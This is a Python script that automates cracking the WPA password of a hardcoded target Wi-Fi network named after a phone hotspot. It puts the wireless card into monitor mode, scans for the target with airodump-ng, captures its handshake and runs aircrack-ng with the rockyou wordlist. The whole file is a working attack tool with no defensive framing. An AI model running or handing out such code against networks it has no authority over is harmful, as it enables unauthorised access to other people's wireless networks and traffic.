import pexpect
import re
import time
import subprocess
import glob
import os
import signal
import logging
import csv

# Hardcoded target SSID
TARGET_SSID = "OnePlus Nord CE 2 Lite 5G"

# Set up logging to log into a file
logging.basicConfig(filename='capture_log.txt', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def run_command(command, timeout=60):
    child = pexpect.spawn(command, timeout=timeout)
    child.expect(pexpect.EOF)
    output = child.before.decode("utf-8")
    logging.info(f"Command output: {output}")
    print(output)  # Display output in terminal
    return output

def start_monitor_mode():
    run_command("sudo airmon-ng check kill")
    run_command("sudo airmon-ng start wlan0")
    logging.info("Monitor mode started on wlan0.")

def capture_networks():
    logging.info("Scanning for networks...")

    # Start airodump-ng to capture data
    airodump_command = "sudo airodump-ng -w irs --output-format csv wlan0"
    child = subprocess.Popen(airodump_command, shell=True, preexec_fn=os.setsid)
    time.sleep(15)  # Allow airodump-ng to run for 15 seconds

    # Send SIGINT to stop airodump-ng (equivalent to pressing Ctrl + C)
    os.killpg(os.getpgid(child.pid), signal.SIGINT)

    # Identify the latest generated CSV file from airodump-ng
    csv_files = glob.glob("irs-*.csv")
    if not csv_files:
        logging.error("No capture file found.")
        return None, None

    latest_csv = max(csv_files, key=os.path.getctime)

    # Read the output file to find the BSSID and channel for the target SSID
    bssid, channel = None, None
    with open(latest_csv, "r") as file:
        reader = csv.reader(file)
        for row in reader:
            # Assuming SSID is in the fourth column, BSSID in the first, and channel in the third
            if len(row) > 13 and row[13].strip() == TARGET_SSID:
                bssid = row[0].strip()  # BSSID
                channel = row[3].strip()  # Channel
                break

    if bssid and channel:
        logging.info(f"Found BSSID: {bssid} and Channel: {channel} for SSID: {TARGET_SSID}")
    else:
        logging.error(f"Failed to find {TARGET_SSID} in the scan results.")
    return bssid, channel

def capture_handshake(bssid, channel):
    logging.info(f"Starting handshake capture for BSSID: {bssid} on channel: {channel}")
    command = f"sudo airodump-ng -c {channel} -w irs -d {bssid} wlan0"
    child = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
    time.sleep(60)  # Allow airodump-ng to capture for 60 seconds

    # Send SIGINT to stop airodump-ng (equivalent to pressing Ctrl + C)
    os.killpg(os.getpgid(child.pid), signal.SIGINT)

def crack_password():
    logging.info("Starting password cracking with aircrack-ng...")
    
    # Find the latest .cap file dynamically
    cap_files = glob.glob("irs-*.cap")
    if not cap_files:
        logging.error("No .cap file found for cracking.")
        return

    latest_cap = max(cap_files, key=os.path.getctime)
    logging.info(f"Using capture file: {latest_cap} for cracking.")

    # Run aircrack-ng and set a timeout
    try:
        # Start aircrack-ng in a subprocess
        aircrack_process = subprocess.Popen(
            ["sudo", "aircrack-ng", latest_cap, "-w", "/usr/share/wordlists/rockyou.txt"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        # Read output while the process runs
        start_time = time.time()
        while aircrack_process.poll() is None:  # Process is still running
            # Check if 10 seconds have passed
            if time.time() - start_time > 10:
                logging.info("10 seconds passed, terminating aircrack-ng process.")
                aircrack_process.terminate()  # Kill the aircrack-ng process
                break
            
            # Print the output from aircrack-ng in real-time
            output = aircrack_process.stdout.readline()
            if output:
                print(output.decode().strip())

        aircrack_process.communicate()  # Get any remaining output and handle termination

    except Exception as e:
        logging.error(f"Error during aircrack-ng execution: {e}")
        print(f"Error during aircrack-ng execution: {e}")

def main():
    logging.info(f"Target SSID: {TARGET_SSID}")
    start_monitor_mode()
    bssid, channel = capture_networks()
    
    if not bssid or not channel:
        logging.error(f"Failed to find {TARGET_SSID}.")
        return
    
    capture_handshake(bssid, channel)
    crack_password()
    logging.info("Process completed.")

    # Keep the program running for an additional 10 seconds before quitting
    time.sleep(10)
    logging.info("Exiting after 10 seconds.")

if __name__ == "__main__":
    main()
